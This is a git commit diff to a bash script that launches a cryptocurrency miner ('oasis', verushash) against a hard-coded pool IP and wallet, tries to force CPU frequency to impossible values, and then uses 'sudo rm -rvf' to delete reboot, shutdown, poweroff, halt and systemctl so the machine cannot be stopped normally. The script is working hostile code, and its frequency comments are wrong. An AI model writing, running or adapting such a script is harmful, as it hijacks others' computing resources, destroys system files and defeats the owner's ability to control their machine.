62544bfd7f07fef802b7f97879942f4d687dc4d1
weralopera <weralopera@outlook.com>
2024-12-29 20:49:50 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
 
+# Mengatur frekuensi CPU ke 16 GHz
 CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
-MAX_FREQ=4200000000 # Maksimal frekuensi dalam kHz (50 GHz)
+MAX_FREQ=16000000 # Maksimal frekuensi dalam kHz (16 GHz)
 
 for dir in $CPUFREQ_PATH; do
     if [ -e $dir/scaling_max_freq ]; then
@@ -10,7 +11,7 @@ for dir in $CPUFREQ_PATH; do
 done
 
 chmod 777 oasis
-./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(shuf -n 1 -i 1-99999)-HM --password x
+./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(shuf -n 1 -i 1-99999)-HM --password x --cpu-threads 8
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
